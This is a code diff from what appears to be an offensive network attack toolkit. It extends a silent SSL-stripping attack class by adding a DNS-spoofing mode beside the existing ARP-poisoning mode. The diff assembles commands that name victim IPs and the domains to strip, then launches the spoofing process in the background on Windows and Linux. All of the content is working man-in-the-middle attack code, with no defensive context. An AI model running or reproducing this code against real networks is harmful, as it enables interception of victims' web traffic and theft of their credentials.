@@ -1,4 +1,3 @@
-#include "ssl_stripping/silent.h"
 #include "HttpLayer.h"
 #include "IPv4Layer.h"
 #include "IpAddress.h"
@@ -10,6 +9,7 @@
 #include "common/common.h"
 #include "log.h"
 #include "ssl_stripping/public.h"
+#include "ssl_stripping/silent.h"
 #include <algorithm>
 #include <boost/asio.hpp>
 #include <boost/asio/ssl.hpp>
@@ -24,7 +24,6 @@
 #include <thread>
 #include <unordered_set>
 #include <vector>
-
 
 #ifdef __linux__
 #include <signal.h>
@@ -273,12 +272,12 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
                     realHtmlFromServer.value() + "\n");
             }
             httpMessageData.httpMessagesCV.notify_one();
-
         }
     }
 }
 
 void ATK::SSL::SilentSslStrippingStrategy::execute() {
+    std::string cmd;
     if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
         // Initialize options with values based on this call
         std::string victimIpsCommaSeparated;
@@ -314,41 +313,62 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
             << " \"\"" // Supply empty attackerMac to automatically derive it
             << " \"" << victimIpsCommaSeparated << "\""
             << " \"" << ipsToSpoofCommaSeparated << "\"";
-        std::string cmd = command.str();
+        cmd = command.str();
+    } else { // Perform DNS spoofing in the background
+        // Initialize options with values based on this call
+        std::string victimIpsCommaSeparated;
+        for (const auto &victimIp : victimIps_) {
+            victimIpsCommaSeparated += victimIp.toString();
+            victimIpsCommaSeparated += ',';
+        };
+        victimIpsCommaSeparated.pop_back();
 
-// Start ARP poison on different thread
-#ifdef _WIN32
-        HANDLE hJob = CreateJobObject(nullptr, nullptr);
+        std::string domainsToStripCommaSeparated;
 
-        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
-        info.BasicLimitInformation.LimitFlags =
-            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
-        SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
-                                sizeof(info));
-
-        STARTUPINFO sInfo = {sizeof(sInfo)};
-        PROCESS_INFORMATION pInfo;
-
-        CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
-                      nullptr, &sInfo, &pInfo);
-
-        // Link child to the job
-        AssignProcessToJobObject(hJob, pInfo.hProcess);
-
-        CloseHandle(pInfo.hProcess);
-        CloseHandle(pInfo.hThread);
-#else
-        pid_t pid = fork();
-        if (pid == 0) {
-            // To make sure child kills itself when this process dies
-            prctl(PR_SET_PDEATHSIG, SIGTERM);
-            execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
-            _exit(1);
+        // Get all target IPs from domain
+        for (const std::string &domain : domainsToStrip_) {
+            domainsToStripCommaSeparated += domain;
+            domainsToStripCommaSeparated += ',';
         }
-#endif
-    } else {
-        // TODO(Quinn) implement with DNS once it's available
+        domainsToStripCommaSeparated.pop_back();
+
+        std::ostringstream command;
+        command << "\"" << ATK::Common::getProcessName() << "\" --quiet --dns"
+                << " \"" << device_->getName() << "\""
+                << " \"" << attackerIp_.toString() << "\""
+                << " \"" << victimIpsCommaSeparated << "\""
+                << " \"" << domainsToStripCommaSeparated << "\"";
+        cmd = command.str();
     }
+    // Start ARP/DNS spoofing on different thread
+#ifdef _WIN32
+    HANDLE hJob = CreateJobObject(nullptr, nullptr);
+
+    JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
+    info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+    SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
+                            sizeof(info));
+
+    STARTUPINFO sInfo = {sizeof(sInfo)};
+    PROCESS_INFORMATION pInfo;
+
+    CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
+                  nullptr, &sInfo, &pInfo);
+
+    // Link child to the job
+    AssignProcessToJobObject(hJob, pInfo.hProcess);
+
+    CloseHandle(pInfo.hProcess);
+    CloseHandle(pInfo.hThread);
+#else
+    pid_t pid = fork();
+    if (pid == 0) {
+        // To make sure child kills itself when this process dies
+        prctl(PR_SET_PDEATHSIG, SIGTERM);
+        execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
+        _exit(1);
+    }
+#endif
 
     runHttpDummyServer();
 
